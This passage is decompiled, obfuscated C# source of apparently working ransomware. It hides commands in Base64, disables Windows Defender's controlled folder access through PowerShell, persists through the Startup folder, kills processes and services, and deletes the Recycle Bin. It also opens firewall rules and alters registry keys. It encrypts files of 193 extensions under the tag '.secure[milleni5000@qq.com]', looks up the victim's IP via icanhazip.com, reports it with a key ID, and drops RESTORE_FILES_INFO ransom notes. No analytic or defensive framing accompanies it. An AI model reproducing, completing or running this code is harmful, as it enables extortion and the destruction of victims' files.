				BbgoMBjicQs(bRWwIGxQDNUf("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (aBFIiCMeYmSkuF == "YES" && yDeZOPUKeirePPx.iZtwJUQedlSQ())
			{
				new oORfxKBHap().orDOJeimdmg(eIjcEQbkOQX: false);
				yDeZOPUKeirePPx.pRYoYkbTyKaY();
			}
		}
		catch (Exception)
		{
		}
		if (oaBHcYrtKCGH == "YES" && yDeZOPUKeirePPx.iZtwJUQedlSQ())
		{
			new oORfxKBHap().orDOJeimdmg(eIjcEQbkOQX: false);
			new oORfxKBHap().NJNXggwpAaS();
		}
		if (uSaJKUYwOykHHna == "YES")
		{
			XfhZHdqcMRaZ.JUtGQXAtjGw();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (XbFJtbTLqw == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(XrcPTuPnzgJC);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (PbKOLZMMGYGNDYs == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					CRySRLWDgJvNv = lZoaXrWeBOx(0, wxgoomixqBIzr.Count);
					File.Copy(fileName, text + wxgoomixqBIzr[CRySRLWDgJvNv], overwrite: true);
					Process.Start(text + wxgoomixqBIzr[CRySRLWDgJvNv]);
					cXQuwfSPMZ();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (HMMADwVzfWCLWj == "YES" && DateTime.Now < DoTaEYarZFYR)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (WuzTfsYKJxZc == "YES" && DateTime.Now > AVUDstsECbSty)
			{
				cXQuwfSPMZ();
			}
		}
		catch
		{
		}
		hhXCoJvWJUyKZv();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(TPOryRCaxA, delegate(string pRbJdSMdpkJf)
			{
				nDKKRmovEZDKb("sc.exe", pRbJdSMdpkJf);
			});
			Parallel.ForEach(fvENgDPmfIX, delegate(string WczjkDftVoOOfTI)
			{
				nDKKRmovEZDKb("net.exe", WczjkDftVoOOfTI);
			});
			Parallel.ForEach(naZfYSlVLbbD, delegate(string VAnAiqEokkV)
			{
				nDKKRmovEZDKb(bRWwIGxQDNUf("dGFza2tpbGwuZXhl"), VAnAiqEokkV);
			});
			if (SNEskbEXCT == "YES")
			{
				Parallel.ForEach(MraFIvcUTXn, delegate(string iNwtSverXY)
				{
					nDKKRmovEZDKb(bRWwIGxQDNUf("dGFza2tpbGwuZXhl"), "/IM " + iNwtSverXY + " /f");
				});
			}
			if (!GMaTMFIxjiIeHx().Contains("XP"))
			{
				fxXZBqTtThkli(EdttAPQcdSxW);
			}
			else
			{
				Parallel.ForEach(RrfarDMdNwPP, delegate(string OyyfjLPNnu)
				{
					nDKKRmovEZDKb(bRWwIGxQDNUf(TCHNzfFRqL("lhXZu4WatRWYzNnd")), OyyfjLPNnu);
				});
			}
			Parallel.ForEach(nSBqCkigxmUihhr, delegate(string guygvjeeNwLGB)
			{
				nDKKRmovEZDKb(bRWwIGxQDNUf("ZGVsLmV4ZQ=="), guygvjeeNwLGB);
			});
			Parallel.ForEach(tvAJhxIRgER, delegate(string tvmLxflNPHtUD)
			{
				nDKKRmovEZDKb("icacls", tvmLxflNPHtUD);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FsPxHJreLDsskIs)
			{
				try
				{
					Thread thread4 = new Thread(YuarFDwJKe.kkWweGCLUVD);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nDKKRmovEZDKb("cmd.exe", bRWwIGxQDNUf("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
			nDKKRmovEZDKb("cmd.exe", bRWwIGxQDNUf("L2MgcmQgL3MgL3EgRDpcXCRSZWN5Y2xlLmJpbg=="));
			nDKKRmovEZDKb(bRWwIGxQDNUf("bmV0c2g="), bRWwIGxQDNUf("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			nDKKRmovEZDKb(bRWwIGxQDNUf("bmV0c2g="), bRWwIGxQDNUf("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9IkZpbGUgYW5kIFByaW50ZXIgU2hhcmluZyIgbmV3IGVuYWJsZT1ZZXM="));
		}
		SecureString secureString = new SecureString();
		if (DBvakJPgHNX == "NO")
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			rtsMhwnvSFB = "9K63HXO3LYDMZ6ZL9Q53YRQQQ0LHKQOX";
		}
		UvUaislHpKJDX = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(LyhWVuwyKLHPz(secureString));
		if (MjMqZJIpeu)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), KYLZxlMaEu)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), KYLZxlMaEu), string.Concat(bRWwIGxQDNUf("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bRWwIGxQDNUf("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", bRWwIGxQDNUf("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bRWwIGxQDNUf("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UvUaislHpKJDX));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), KYLZxlMaEu), "\r\nAdditional KeyID: " + UvUaislHpKJDX);
				}
			}
			catch (Exception ex7)
			{
				if (nmuAfqaGuDVCWu)
				{
					try
					{
						File.AppendAllText(vsTGVFSJmItByidD, "Error while creating Local Report: " + ex7.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		DDkfEBeYSSAdQ.CcRLCRCYPbbBj(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), VBnebdmzVyVM), sTVHCjNeuSKvKBk(UvUaislHpKJDX), null, null, "Installer...", "Ctrl+Shift+X", null);
		try
		{
			QHzylkAvKdeTKM(new string[1] { "[auto]" }, new string[193]
			{
				"ico", "lua", "sh", "xsl", "vbs", "jar", "7", "dat", "txt", "jpeg",
				"gif", "jpg", "png", "php", "cs", "cpp", "rar", "zip", "html", "htm",
				"xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx", "sxi", "sxw", "odt",
				"hwp", "tar", "bz2", "mkv", "eml", "msg", "ost", "pst", "edb", "sql",
				"accdb", "mdb", "dbf", "odb", "myd", "c", "swift", "cpp", "pas", "asm",
				"key", "pfx", "pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw",
				"nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3", "sqlitedb", "java",
				"class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert", "docm", "xlsm", "dwg",
				"bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov", "xdw", "ods", "wav",
				"mp3", "aiff", "flac", "m4a", "csv", "sav", "ora", "mdf", "ldf", "ndf",
				"dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z", "ini", "lnk", "msi",
				"tmp", "3g2", "3gp", "flv", "h264", "rm", "swf", "wmv", "tex", "wpd",
				"icns", "drv", "dmp", "cur", "cpl", "cfg", "cab", "vb", "cgi", "pps",
				"odp", "xhtml", "rss", "py", "part", "jsp", "js", "css", "cfm", "cer",
				"asp", "tif", "ps", "bmp", "ai", "ttf", "otf", "fon", "fnt", "wsf",
				"gadget", "com", "bin", "bat", "apk", "vcf", "oft", "emlx", "email", "log",
				"db", "z", "targz", "rpm", "pkg", "deb", "arj", "wpl", "wma", "ogg",
				"mpa", "mid", "cda", "aif", "vcd", "toast", "iso", "dmg", "vob", "mpg",
				"m4v", "h", "exe", "lib", "dll", "inf", "sys", "cat", "data", "skn",
				"xml", "dui", "sfx"
			}, new string[0], LyhWVuwyKLHPz(secureString), ".secure[milleni5000@qq.com]");
		}
		catch (Exception ex9)
		{
			if (nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(vsTGVFSJmItByidD, "Finish process: " + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(bRWwIGxQDNUf("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(bRWwIGxQDNUf("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(UvUaislHpKJDX);
				if (hmqxhsSApKDzHR == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(bRWwIGxQDNUf("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(oqWWUuhrnyOw.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + UvUaislHpKJDX);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in ASgzEyFxzgQhoK)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAditional KeyId:\r\n" + UvUaislHpKJDX);
				}
			}
			catch (Exception)
			{
			}
			if (!oNHBERkFRJGTwfBH && num > 10)
			{
				break;
			}
		}
		if (FFqGwatACRvkJ == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(bRWwIGxQDNUf("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(bRWwIGxQDNUf("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(UvUaislHpKJDX + bRWwIGxQDNUf("PC9wPg=="));
					if (hmqxhsSApKDzHR == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(bRWwIGxQDNUf("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + bRWwIGxQDNUf("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(oqWWUuhrnyOw.Count) + bRWwIGxQDNUf("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", bRWwIGxQDNUf("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + UvUaislHpKJDX + bRWwIGxQDNUf("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (lvDCNjDIpDA == "YES")
		{
			try
			{
				if (hmqxhsSApKDzHR == "NO")
				{
					fRNtfJxgwGHJ.BoxBzoXnkhGOzBWI("URL", "USERNAME", "ACCESO", string.Concat(bRWwIGxQDNUf("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bRWwIGxQDNUf("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", bRWwIGxQDNUf("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bRWwIGxQDNUf("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(oqWWUuhrnyOw.Count), "\r\n", bRWwIGxQDNUf("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UvUaislHpKJDX));
				}
				else
				{
					fRNtfJxgwGHJ.BoxBzoXnkhGOzBWI("URL", "USERNAME", "ACCESO", string.Concat(bRWwIGxQDNUf("Q2xpZW50IElQOiA="), new WebClient().DownloadString(bRWwIGxQDNUf("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", bRWwIGxQDNUf("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", bRWwIGxQDNUf("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(oqWWUuhrnyOw.Count), "\r\n", bRWwIGxQDNUf("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), UvUaislHpKJDX));
				}
			}
			catch
			{
			}
		}
		if (wfDodeaGqrJV == "YES")
		{
			try
			{
				ADSKDCYphBdJIm.oupLakYMvHAss(new Uri(""));
			}
			catch
			{
			}
		}
		if (FFqGwatACRvkJ == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(bRWwIGxQDNUf("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(bRWwIGxQDNUf("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(xgernjlYkaEXQXz))
		{
			try
			{
				File.Delete(xgernjlYkaEXQXz);
			}
			catch
			{
			}
		}
		if (nmuAfqaGuDVCWu)
		{
			try
			{
				File.AppendAllText(vsTGVFSJmItByidD, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (CSzqWqFZUtqvTzB == "EVET")
		{
			cXQuwfSPMZ();
		}
	}

	public static void XrcPTuPnzgJC()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(bRWwIGxQDNUf("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), bRWwIGxQDNUf("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int lZoaXrWeBOx(int GlqABBfBiMdcD, int LfUJxmAvpywvNszQ)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(GlqABBfBiMdcD, LfUJxmAvpywvNszQ);
	}

	public static List<string> ocDDAYDYhgb(string zfyShclcdlvZ, string[] UrskNNuvFgFGH, string tvLtMvCzMNAlWX, string[] sRpnmbpjddZbVo, string wuynXKLjrm)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(zfyShclcdlvZ);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains(":\\windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains(":\\programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0159;
				}
			}
			catch
			{
			}
			continue;
			IL_0159:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(bRWwIGxQDNUf("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".secure[milleni5000@qq.com]") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(VBnebdmzVyVM) && !fileInfo.FullName.Contains(vsTGVFSJmItByidD) && !fileInfo.FullName.Contains(KYLZxlMaEu))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ebTviElysEaTK) * 1024.0 * 1024.0 && lpGWtAojVdYTD == "YES")
						{
							list.Add(fileInfo.FullName);
							wQSklhyaGNc(list, UrskNNuvFgFGH, tvLtMvCzMNAlWX, sRpnmbpjddZbVo, wuynXKLjrm);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && lpGWtAojVdYTD == "NO")
						{
							list.Add(fileInfo.FullName);
							wQSklhyaGNc(list, UrskNNuvFgFGH, tvLtMvCzMNAlWX, sRpnmbpjddZbVo, wuynXKLjrm);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> hOmDdtFLjOmIm(string uZOveDjyiD)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(uZOveDjyiD);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains(":\\windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains(":\\programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(bRWwIGxQDNUf("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(ebTviElysEaTK) * 1024.0 * 1024.0 && lpGWtAojVdYTD == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && lpGWtAojVdYTD == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(bRWwIGxQDNUf("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".secure[milleni5000@qq.com]") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(ebTviElysEaTK) * 1024.0 * 1024.0 && lpGWtAojVdYTD == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && lpGWtAojVdYTD == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string nDKKRmovEZDKb(string xQDsyTrGsoiflG = "", string lqudUWBfTSjj = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = xQDsyTrGsoiflG,
				Arguments = lqudUWBfTSjj,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void BbgoMBjicQs(string qGekLjDoXwRz)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = qGekLjDoXwRz,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string TCHNzfFRqL(string xdUpGgfBSrxkK)
	{
		char[] array = xdUpGgfBSrxkK.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string bRWwIGxQDNUf(string GxccMNQggSLTGVYL)
	{
		byte[] bytes = Convert.FromBase64String(GxccMNQggSLTGVYL);
		return Encoding.UTF8.GetString(bytes);
	}

	public static bool uYozPezdhhly()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void fxXZBqTtThkli(string RXIuxJwYLesowW)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = bRWwIGxQDNUf("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + RXIuxJwYLesowW;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool nxevbysxclBn(string tlXwwgpZzLfQqE, string CsMBVWnGlfEto)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(tlXwwgpZzLfQqE, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(CsMBVWnGlfEto);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(tlXwwgpZzLfQqE, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string LyhWVuwyKLHPz(SecureString ZXuLQgdeeeRi)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(ZXuLQgdeeeRi);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void hhXCoJvWJUyKZv()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string gxccMNQggSLTGVYL = TCHNzfFRqL("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(bRWwIGxQDNUf(gxccMNQggSLTGVYL), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bRWwIGxQDNUf("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("d21pYy5leGU="));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(bRWwIGxQDNUf("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				gxccMNQggSLTGVYL = TCHNzfFRqL("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(bRWwIGxQDNUf(gxccMNQggSLTGVYL), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bRWwIGxQDNUf("UmFjY2luZQ=="));
					registryKey.Close();
				}
				gxccMNQggSLTGVYL = TCHNzfFRqL("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(bRWwIGxQDNUf(gxccMNQggSLTGVYL), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bRWwIGxQDNUf("UmFjY2luZQ=="));
					registryKey.Close();
				}
				gxccMNQggSLTGVYL = TCHNzfFRqL("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(bRWwIGxQDNUf(gxccMNQggSLTGVYL), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(bRWwIGxQDNUf("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
